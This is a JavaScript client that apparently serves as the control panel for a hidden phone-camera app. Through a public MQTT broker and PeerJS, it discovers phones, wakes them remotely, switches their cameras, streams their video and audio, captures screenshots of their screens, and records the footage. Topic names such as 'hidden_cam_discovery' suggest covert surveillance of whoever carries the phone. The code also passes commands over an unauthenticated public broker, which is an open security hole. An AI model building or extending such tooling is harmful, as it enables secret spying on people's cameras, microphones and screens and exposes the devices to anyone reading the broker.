// The ID of the camera app will be read from the input field

let peer = null;
let mediaConnection = null;
let dataConnection = null; // For sending commands like switch camera
let remoteStreamObj = null;

let mediaRecorder;
let recordedChunks = [];
let isRecording = false;
let isAudioMuted = false;

// Screen watch (MQTT screenshot-based) state
let isWatchingScreen = false;
let screenMqttTopic = null;
let screenFrameCount = 0;
let screenFpsTimer = null;

const statusText = document.getElementById('statusText');
const remoteVideo = document.getElementById('remoteVideo');
const screenFrame = document.getElementById('screenFrame');
const fpsCounter = document.getElementById('fpsCounter');
const connectBtn = document.getElementById('connectBtn');
const disconnectBtn = document.getElementById('disconnectBtn');
const deviceIdInput = document.getElementById('deviceIdInput');

// New Buttons
const switchCamBtn = document.getElementById('switchCamBtn');
const snapshotBtn = document.getElementById('snapshotBtn');
const recordBtn = document.getElementById('recordBtn');
const muteAudioBtn = document.getElementById('muteAudioBtn');
const switchViewBtn = document.getElementById('switchViewBtn');
const signalBtn = document.getElementById('signalBtn');
const volumeSlider = document.getElementById('volumeSlider');

let currentMode = "CAMERA"; // "CAMERA" or "SCREEN"
let myPeerId = null;                // this viewer's PeerJS id (sent to phones in WAKE_UP)
let streamReceived = false;          // true once a remote stream arrives
let connectionAttemptsActive = false; // false once a stream arrives (cancel retries)

function updateStatus(message, color = "#FFA500") {
    statusText.textContent = message;
    statusText.style.color = color;
}

function initializePeer() {
    const viewerId = "viewer_" + Math.random().toString(36).substr(2, 9);
    peer = new Peer(viewerId, { debug: 2 });

    peer.on('open', (id) => {
        myPeerId = id;
        console.log("Viewer PeerJS ready:", id);
        updateStatus("Ready to connect to camera.");
        connectBtn.disabled = false;
    });

    peer.on('error', (err) => {
        console.error("PeerJS error:", err);
        if (err.type === 'peer-unavailable') {
            // Ignore if we are retrying (the phone might have a new ID) or if we are already connected via WAKE_UP reverse call
            if (connectionAttemptsActive || streamReceived) {
                console.log("Ignoring peer-unavailable error because we are retrying or connected.");
                return;
            }
        }
        connectionAttemptsActive = false;
        updateStatus("Connection Error: " + err.type, "#f44336");
        disconnectBtn.disabled = true;
        connectBtn.disabled = false;
        disableExtraControls();
    });

    peer.on('call', (call) => {
        mediaConnection = call;
        handleCall(call);
    });
}

function handleCall(call) {
    updateStatus("Connecting to camera stream...", "#FFA500");
    call.answer(null); 

    call.on('stream', (remoteStream) => {
        updateStatus("Connected! Streaming video/audio.", "#4CAF50");
        streamReceived = true;
        connectionAttemptsActive = false;
        remoteStreamObj = remoteStream;
        remoteVideo.srcObject = remoteStream;
        remoteVideo.play().catch(e => console.warn("Auto-play prevented:", e));
        
        connectBtn.disabled = true;
        disconnectBtn.disabled = false;
        enableExtraControls();
        volumeSlider.disabled = false;
    });

    call.on('close', () => {
        updateStatus("Camera disconnected.", "#f44336");
        remoteVideo.srcObject = null;
        remoteStreamObj = null;
        connectBtn.disabled = false;
        disconnectBtn.disabled = true;
        disableExtraControls();
        volumeSlider.disabled = true;
    });
}

connectBtn.addEventListener('click', () => {
    const targetId = deviceIdInput.value.trim();
    if (!targetId) {
        alert("Please select or enter a Phone ID first.");
        return;
    }

    if (!peer) {
        initializePeer();
        updateStatus("Initializing connection...", "#FFA500");
        setTimeout(() => connectToCamera(targetId), 2000); 
    } else {
        connectToCamera(targetId);
    }
});

const COMMAND_TOPIC_BASE = "ar115_hidden_cam_discovery_99182/commands/";

function resolveBaseId(input) {
    const base = sessionToBase.get(input);
    return base || input;
}

// Publish a WAKE_UP command: the phone (already "online" via MQTT) recreates its
// PeerJS peer and reverse-calls this viewer, bypassing the flaky data-channel path.
function sendWakeUpCommand(baseId) {
    if (!myPeerId) {
        console.log("Viewer peer not ready yet, cannot send WAKE_UP");
        return false;
    }
    const topic = COMMAND_TOPIC_BASE + baseId;
    const payload = JSON.stringify({ cmd: "WAKE_UP", viewerId: myPeerId, ts: Date.now() });
    mqttClient.publish(topic, payload, { qos: 1 });
    console.log("WAKE_UP sent ->", topic, payload);
    return true;
}

// Send a control command to the phone. Prefer MQTT (works even when the
// data channel is not open, e.g. after the WAKE_UP reverse-call flow), and
// fall back to the data channel when available.
function sendControlCommand(cmd, extra) {
    const baseId = resolveBaseId(deviceIdInput.value);
    let sent = false;
    if (mqttClient && mqttClient.connected) {
        const topic = COMMAND_TOPIC_BASE + baseId;
        const payload = JSON.stringify(Object.assign({ cmd: cmd, ts: Date.now() }, extra || {}));
        mqttClient.publish(topic, payload, { qos: 1 });
        console.log("Control cmd via MQTT ->", topic, payload);
        sent = true;
    }
    if (dataConnection && dataConnection.open) {
        dataConnection.send(Object.assign({ command: cmd }, extra || {}));
        console.log("Control cmd via data channel ->", cmd);
        sent = true;
    }
    return sent;
}

function connectToCamera(targetId) {
    streamReceived = false;
    connectionAttemptsActive = true;
    
    // Reset to camera mode upon new connection to match phone's default WAKE_UP state
    if (currentMode === "SCREEN") {
        currentMode = "CAMERA";
        switchViewBtn.innerHTML = '<i class="fas fa-desktop"></i> Switch to Screen';
        isWatchingScreen = false;
        screenCanvas.style.display = "none";
        remoteVideo.style.display = "block";
    }

    const baseId = resolveBaseId(targetId);
    // 1) Signal over MQTT: phone reconnects its peer and reverse-calls us.
    sendWakeUpCommand(baseId);
    // 2) Keep the direct data-channel path as fallback, re-resolving the session
    //    ID each attempt (the phone's peer ID changes after wake-up).
    connectToCameraWithRetry(targetId, 1);
}

function connectToCameraWithRetry(targetId, attempt) {
    if (!connectionAttemptsActive) return;
    const sessionId = resolveLatestSessionId(targetId);
    updateStatus("Calling camera (" + sessionId + ")... attempt " + attempt + "/3", "#FFA500");
    connectBtn.disabled = true;

    // Save to dropdown history
    saveDeviceId(sessionId);

    if (dataConnection) {
        try { dataConnection.close(); } catch (e) {}
        dataConnection = null;
    }

    dataConnection = peer.connect(sessionId);
    let opened = false;

    const openTimeout = setTimeout(() => {
        if (!connectionAttemptsActive) return;
        if (!opened) {
            console.log("Data channel open timed out, retrying...");
            try { dataConnection.close(); } catch (e) {}
            dataConnection = null;
            if (attempt < 3) {
                connectToCameraWithRetry(targetId, attempt + 1);
            } else {
                updateStatus("Camera not reachable. Make sure the app is running.", "#f44336");
                connectBtn.disabled = false;
            }
        }
    }, 8000);

    dataConnection.on('open', () => {
        opened = true;
        clearTimeout(openTimeout);
        updateStatus("Requesting stream from camera...", "#FFA500");
        dataConnection.send({ command: "START_STREAM" });
    });

    dataConnection.on('error', (err) => {
        clearTimeout(openTimeout);
        if (!connectionAttemptsActive) return;
        if (attempt < 3) {
            console.log("Data channel error, retrying:", err);
            try { dataConnection.close(); } catch (e) {}
            dataConnection = null;
            connectToCameraWithRetry(targetId, attempt + 1);
        } else if (currentMode === "CAMERA") {
            updateStatus("Camera not reachable. Make sure the app is running.", "#f44336");
            connectBtn.disabled = false;
        }
    });
}

disconnectBtn.addEventListener('click', () => {
    connectionAttemptsActive = false;
    // Stop screen watch if active
    if (isWatchingScreen) {
        stopScreenWatch();
    }
    sendControlCommand("STOP_STREAM");
    if (dataConnection) {
        setTimeout(() => {
            dataConnection.close();
            dataConnection = null;
        }, 500);
    }
    if (mediaConnection) {
        mediaConnection.close();
        mediaConnection = null;
    }
    remoteVideo.srcObject = null;
    remoteStreamObj = null;
    updateStatus("Disconnected.", "#ffffff");
    connectBtn.disabled = false;
    disconnectBtn.disabled = true;
    disableExtraControls();
    volumeSlider.disabled = true;
});

// --- New Features Implementation ---

function enableExtraControls() {
    switchCamBtn.disabled = false;
    snapshotBtn.disabled = false;
    recordBtn.disabled = false;
    muteAudioBtn.disabled = false;
    switchViewBtn.disabled = false;
}

function disableExtraControls() {
    switchCamBtn.disabled = true;
    snapshotBtn.disabled = true;
    recordBtn.disabled = true;
    muteAudioBtn.disabled = true;
    switchViewBtn.disabled = true;
    
    if (isRecording) {
        stopRecording();
    }
}

// 1. Switch Camera (Send command via Data Channel)
switchCamBtn.addEventListener('click', () => {
    if (sendControlCommand("SWITCH_CAMERA")) {
        updateStatus("Switching camera...", "#2196F3");
    } else {
        alert("Control connection not active.");
    }
});

// Switch View: Camera <-> Screen (MQTT screenshots)
switchViewBtn.addEventListener('click', () => {
    if (currentMode === "CAMERA") {
        // Switch to Screen mode (MQTT screenshots)
        currentMode = "SCREEN";
        switchViewBtn.textContent = "Switch to Camera";
        switchViewBtn.style.backgroundColor = "#9C27B0";
        updateStatus("Switching to Screen View (MQTT)...", "#9C27B0");
        startScreenWatch();
    } else {
        // Switch back to Camera mode (PeerJS)
        currentMode = "CAMERA";
        switchViewBtn.textContent = "Switch to Screen";
        switchViewBtn.style.backgroundColor = "#2196F3";
        updateStatus("Switching to Camera View...", "#2196F3");
        stopScreenWatch();
        sendControlCommand("SWITCH_TO_CAMERA");
    }
});

// --- Screen Watch (MQTT Screenshot Streaming) ---

function startScreenWatch() {
    const baseId = resolveBaseId(deviceIdInput.value);
    screenMqttTopic = "ar115_hidden_cam_discovery_99182/screen/" + baseId;
    
    // Subscribe to screen topic
    if (mqttClient && mqttClient.connected) {
        mqttClient.subscribe(screenMqttTopic, { qos: 0 }, (err) => {
            if (err) {
                console.error("Failed to subscribe to screen topic:", err);
                updateStatus("Screen subscribe failed!", "#f44336");
                return;
            }
            console.log("Subscribed to screen topic:", screenMqttTopic);
        });
    }
    
    // Send command to phone to start screenshot loop
    sendControlCommand("START_SCREEN_WATCH");
    isWatchingScreen = true;
    
    // Show screen frame, hide video
    remoteVideo.style.display = "none";
    screenFrame.style.display = "block";
    fpsCounter.style.display = "block";
    
    // Start FPS counter
    screenFrameCount = 0;
    screenFpsTimer = setInterval(() => {
        fpsCounter.textContent = screenFrameCount + " FPS";
        screenFrameCount = 0;
    }, 1000);
}

function stopScreenWatch() {
    // Unsubscribe from screen topic
    if (screenMqttTopic && mqttClient && mqttClient.connected) {
        mqttClient.unsubscribe(screenMqttTopic);
        console.log("Unsubscribed from screen topic:", screenMqttTopic);
    }
    
    // Send command to phone to stop screenshot loop
    sendControlCommand("STOP_SCREEN_WATCH");
    isWatchingScreen = false;
    
    // Clear the canvas to avoid showing stale images later
    const ctx = screenFrame.getContext('2d');
    ctx.clearRect(0, 0, screenFrame.width, screenFrame.height);
    
    // Show video, hide screen frame
    remoteVideo.style.display = "block";
    screenFrame.style.display = "none";
    fpsCounter.style.display = "none";
    
    // Stop FPS counter
    if (screenFpsTimer) {
        clearInterval(screenFpsTimer);
        screenFpsTimer = null;
    }
    screenMqttTopic = null;
}

// 2. Snapshot
snapshotBtn.addEventListener('click', () => {
    if (!remoteStreamObj) return;
    
    const canvas = document.createElement('canvas');
    canvas.width = remoteVideo.videoWidth;
    canvas.height = remoteVideo.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(remoteVideo, 0, 0, canvas.width, canvas.height);
    
    // Create download link
    const dataURL = canvas.toDataURL('image/png');
    const a = document.createElement('a');
    a.href = dataURL;
    a.download = `snapshot_${new Date().getTime()}.png`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    
    updateStatus("Snapshot saved!", "#9C27B0");
    setTimeout(() => updateStatus("Connected! Streaming video/audio.", "#4CAF50"), 2000);
});

// 3. Screen Record
recordBtn.addEventListener('click', () => {
    if (!isRecording) {
        startRecording();
    } else {
        stopRecording();
    }
});

function startRecording() {
    if (!remoteStreamObj) return;
    
    recordedChunks = [];
    try {
        mediaRecorder = new MediaRecorder(remoteStreamObj);
    } catch (e) {
        console.error("MediaRecorder creation failed:", e);
        alert("Recording not supported on this browser.");
        return;
    }
    
    mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
            recordedChunks.push(event.data);
        }
    };
    
    mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: 'video/webm' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `recording_${new Date().getTime()}.webm`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    };
    
    mediaRecorder.start();
    isRecording = true;
    recordBtn.textContent = "Stop Recording";
    recordBtn.style.backgroundColor = "#f44336"; // Red to indicate recording
    updateStatus("Recording started...", "#FF9800");
}

function stopRecording() {
    if (mediaRecorder && mediaRecorder.state !== "inactive") {
        mediaRecorder.stop();
    }
    isRecording = false;
    recordBtn.textContent = "Start Record";
    recordBtn.style.backgroundColor = "#FF9800";
    updateStatus("Recording saved!", "#FF9800");
    setTimeout(() => updateStatus("Connected! Streaming video/audio.", "#4CAF50"), 2000);
}

// Save device ID to local storage for the dropdown
function saveDeviceId(id) {
    // If a session ID was passed, store its base ID instead
    const baseId = sessionToBase.get(id) || id;
    let saved = JSON.parse(localStorage.getItem('savedDevices') || '[]');
    if (!saved.includes(baseId)) {
        saved.push(baseId);
        localStorage.setItem('savedDevices', JSON.stringify(saved));
        updateLiveDeviceDropdown();
    }
}

// Send a one-shot wake-up signal to the currently selected phone
signalBtn.addEventListener('click', () => {
    const targetId = deviceIdInput.value.trim();
    if (!targetId) {
        alert("Please select or enter a Phone ID first.");
        return;
    }
    if (!peer || !myPeerId) {
        alert("Viewer peer is still initializing...");
        return;
    }
    const baseId = resolveBaseId(targetId);
    const ok = sendWakeUpCommand(baseId);
    updateStatus(ok ? "Wake-up signal sent to " + baseId : "Signal NOT sent (MQTT down?)", ok ? "#4CAF50" : "#f44336");
    setTimeout(() => updateStatus("Ready to connect to camera."), 2500);
});

// --- Auto-Discovery using Public MQTT ---
const DISCOVERY_BASE_TOPIC = "ar115_hidden_cam_discovery_99182/devices/";
const DISCOVERY_WAKE_TOPIC = "ar115_hidden_cam_discovery_99182/wake";
const ALIAS_TOPIC = "ar115_hidden_cam_discovery_99182/aliases";

let onlineDevices = new Map(); // baseId -> { id: sessionId, ts: timestamp }
let sessionToBase = new Map(); // sessionId -> baseId
let globalAliases = {}; // baseId -> alias (Synced via MQTT)

const mqttClient = mqtt.connect('wss://broker.hivemq.com:8884/mqtt');

mqttClient.on('connect', () => {
    console.log("Connected to Discovery Server");
    mqttClient.subscribe(DISCOVERY_BASE_TOPIC + "+");
    mqttClient.subscribe(ALIAS_TOPIC); // Subscribe to aliases topic
});
mqttClient.on('message', (topic, message) => {
    // Handle screen frames from the phone
    if (isWatchingScreen && screenMqttTopic && topic === screenMqttTopic) {
        const base64 = message.toString();
        if (base64 && base64.length > 100) { // Sanity check - valid base64 JPEG
            const img = new Image();
            img.onload = () => {
                if (screenFrame.width !== img.width) screenFrame.width = img.width;
                if (screenFrame.height !== img.height) screenFrame.height = img.height;
                const ctx = screenFrame.getContext('2d');
                ctx.drawImage(img, 0, 0);
            };
            img.src = "data:image/jpeg;base64," + base64;
            
            screenFrameCount++;
            if (!streamReceived) {
                updateStatus("Screen streaming via MQTT (Canvas Enhanced)!", "#9C27B0");
            }
        }
        return;
    }
    
    // Handle device discovery messages
    if (topic.startsWith(DISCOVERY_BASE_TOPIC)) {
        const payload = message.toString();
        const baseId = topic.split('/').pop();

        if (payload === "") {
            // Device went offline (Last Will and Testament)
            console.log("Phone disconnected:", baseId);
            onlineDevices.delete(baseId);
        } else {
            // Device is online. Payload is JSON {id, ts} (new) or a raw session ID (legacy).
            let sessionId = payload;
            let ts = Date.now();
            try {
                const parsed = JSON.parse(payload);
                if (parsed && parsed.id) {
                    sessionId = parsed.id;
                    ts = parsed.ts || Date.now();
                }
            } catch (e) { /* legacy raw session ID */ }

            console.log("Discovered phone online:", baseId, "->", sessionId);
            onlineDevices.set(baseId, { id: sessionId, ts: ts });
            sessionToBase.set(sessionId, baseId);
            saveDeviceId(baseId); // Keep base ID in history (not volatile session IDs)

            // Auto-fill input if it's currently empty
            if (deviceIdInput.value.trim() === "") {
                deviceIdInput.value = sessionId;
                updateStatus("Auto-detected new phone! Ready to connect.", "#4CAF50");
            }
        }
        updateLiveDeviceDropdown();
    } else if (topic === ALIAS_TOPIC) {
        // Handle incoming alias updates
        try {
            const payload = message.toString();
            if (payload) {
                globalAliases = JSON.parse(payload);
                console.log("Received updated aliases from MQTT:", globalAliases);
                updateLiveDeviceDropdown(); // Refresh dropdown with new names
            }
        } catch (e) {
            console.error("Error parsing aliases from MQTT:", e);
        }
    }
});

// Mark devices offline if their heartbeat is stale (phone killed / network lost)
setInterval(() => {
    const now = Date.now();
    let changed = false;
    onlineDevices.forEach((info, baseId) => {
        if (now - info.ts > 45000) {
            console.log("Phone heartbeat stale, marking offline:", baseId);
            sessionToBase.delete(info.id);
            onlineDevices.delete(baseId);
            changed = true;
        }
    });
    if (changed) updateLiveDeviceDropdown();
}, 10000);

// Resolve the latest live session ID for a base ID (or the raw input if it's already a session)
function resolveLatestSessionId(input) {
    const info = onlineDevices.get(input);
    if (info && info.id) return info.id;
    const base = sessionToBase.get(input);
    if (base) {
        const info2 = onlineDevices.get(base);
        if (info2 && info2.id) return info2.id;
    }
    return input;
}

let lastDropdownSignature = "";
let selectedBaseId = "";   // base ID of the currently selected option (stable across rebuilds)

function updateLiveDeviceDropdown() {
    // Build a signature from the live devices (excluding volatile ts) plus the
    // saved history. Skip the rebuild entirely if nothing changed, so the
    // dropdown stops flickering on every MQTT heartbeat.
    let sigParts = [];
    onlineDevices.forEach((info, baseId) => {
        sigParts.push(baseId + "=" + info.id);
    });
    let savedSig = JSON.parse(localStorage.getItem('savedDevices') || '[]');
    sigParts = sigParts.concat(savedSig);
    
    // Also include aliases in the signature, so renaming triggers a UI update
    sigParts.push(JSON.stringify(globalAliases));
    
    const signature = sigParts.join("|");
    if (signature === lastDropdownSignature) return;
    lastDropdownSignature = signature;

    // Save current selection to restore it
    const currentVal = deviceIdInput.value;
    
    deviceIdInput.innerHTML = '';
    const defOpt = document.createElement('option');
    defOpt.value = "";
    defOpt.text = "-- Select Phone --";
    deviceIdInput.appendChild(defOpt);
    
    let addedBaseIds = new Set();
    let optionValues = new Set();
    
    // Add online devices first
    onlineDevices.forEach((info, baseId) => {
        if (!addedBaseIds.has(baseId)) {
            const option = document.createElement('option');
            option.value = info.id;
            option.dataset.baseId = baseId;
            const displayName = globalAliases[baseId] || baseId;
            option.text = "🟢 " + displayName + " (Online)";
            deviceIdInput.appendChild(option);
            addedBaseIds.add(baseId);
            optionValues.add(info.id);
        }
    });
    
    // Add offline history devices
    let saved = JSON.parse(localStorage.getItem('savedDevices') || '[]');
    saved.forEach(id => {
        if (!addedBaseIds.has(id)) {
            const option = document.createElement('option');
            option.value = id; // offline: only the base ID is known
            option.dataset.baseId = id;
            const displayName = globalAliases[id] || id;
            option.text = "⚪ " + displayName + " (Offline)";
            deviceIdInput.appendChild(option);
            addedBaseIds.add(id);
            optionValues.add(id);
        }
    });
    
    // Restore the user's selection by stable base ID (session IDs change on reconnect)
    if (selectedBaseId) {
        const opt = Array.from(deviceIdInput.options).find(o => o.dataset.baseId === selectedBaseId);
        if (opt) deviceIdInput.value = opt.value;
    } else if (optionValues.has(currentVal)) {
        deviceIdInput.value = currentVal;
    }
}

// Remember the user's selection so dropdown rebuilds don't reset it
deviceIdInput.addEventListener('change', () => {
    const sel = deviceIdInput.selectedOptions && deviceIdInput.selectedOptions[0];
    selectedBaseId = (sel && sel.dataset.baseId) || "";
});

// 4. Mute Audio (Local Playback)
muteAudioBtn.addEventListener('click', () => {
    isAudioMuted = !isAudioMuted;
    remoteVideo.muted = isAudioMuted;
    
    if (isAudioMuted) {
        muteAudioBtn.textContent = "Unmute Audio";
        muteAudioBtn.style.backgroundColor = "#f44336"; // Red
    } else {
        muteAudioBtn.textContent = "Mute Audio";
        muteAudioBtn.style.backgroundColor = "#607D8B"; // Default
    }
});

// 5. Volume Slider
volumeSlider.addEventListener('input', (e) => {
    remoteVideo.volume = e.target.value;
});

// Rename functionality
document.getElementById('renameDeviceBtn').addEventListener('click', () => {
    const currentValue = deviceIdInput.value;
    if (!currentValue) {
        alert("Please select a device to rename first.");
        return;
    }

    // Resolve base ID from the selected value
    const sel = deviceIdInput.selectedOptions && deviceIdInput.selectedOptions[0];
    let targetBaseId = (sel && sel.dataset.baseId) ? sel.dataset.baseId : (sessionToBase.get(currentValue) || currentValue);
    
    let currentName = globalAliases[targetBaseId] || targetBaseId;
    let newName = prompt("Enter a new name for this device:", currentName);
    
    if (newName !== null) {
        newName = newName.trim();
        if (newName === "") {
            // If empty, remove the alias
            delete globalAliases[targetBaseId];
        } else {
            globalAliases[targetBaseId] = newName;
        }
        
        // Publish updated aliases to MQTT with retain: true
        if (mqttClient && mqttClient.connected) {
            mqttClient.publish(ALIAS_TOPIC, JSON.stringify(globalAliases), { retain: true });
            console.log("Published updated aliases to MQTT:", globalAliases);
            updateLiveDeviceDropdown(); // Update local UI immediately
        } else {
            alert("Error: Not connected to MQTT broker. Cannot save rename.");
        }
    }
});

// Initialize peer when page loads
initializePeer();

// Build the dropdown once all variables/functions are defined
updateLiveDeviceDropdown();
